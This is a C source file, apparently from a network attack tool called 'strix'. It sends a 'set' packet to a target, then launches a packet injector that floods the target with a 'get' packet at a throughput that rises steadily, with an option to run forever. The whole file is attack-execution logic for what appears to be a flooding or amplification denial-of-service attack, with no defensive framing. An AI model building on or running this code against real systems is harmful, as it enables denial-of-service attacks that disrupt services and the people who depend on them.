#include <time.h>
#include "strix.h"
#include "executor.h"
#include "netbasic.h"
#include "injector/injector.h"

static void *_executorHandler(void *arg)
{
  AttackData *atkData = (AttackData *)arg;
  int throughput = atkData->initialThroughput;
  bool infLoop = (atkData->nInjections <= 0) ? true : false;  
  int loopCounter = atkData->nInjections--;
  struct timespec freq = {
               .tv_sec = atkData->timeFrequency,  /*seconds*/
               .tv_nsec = 0       /*nanoseconds*/
          };
  
  InjectionResume(atkData->injectorId);
  atkData->atkStatus = Attack_Status_Running;
  while( loopCounter > 0 || infLoop ){
    InjectionNewThroughput(atkData->injectorId,  throughput);
    nanosleep(&freq, NULL);
    throughput += atkData->incrementThroughput;
    loopCounter--;
  }
  
  atkData->atkStatus = Attack_Status_Finished;

  return NULL; //Keep compiler quiet
}

void ExecuteAttack( AttackData * atkData )
{
  if( !send_data(atkData->setPacket->packet_ptr, atkData->setPacket->size, (struct sockaddr *)atkData->setPacket->saddr) ){
    handle_fatal("Socket Error\n");
  }
   
  atkData->injectorId = CreateInjection( atkData->getPacket, atkData->initialThroughput );
  

  if( 0 != pthread_create(&(atkData->executorId), NULL, _executorHandler, atkData) ){
    char buffer[50];
    sprintf (buffer, "Cannot create thread: ERROR %d\n", errno);
    InjectionDestroy(atkData->injectorId);
    handle_fatal(buffer);
  }

}

void DestroyAttack( AttackData * atkData )
{
  if( NULL == atkData ){
    return;
  }

  pthread_cancel(atkData->executorId); 
  InjectionDestroy(atkData->injectorId);
}
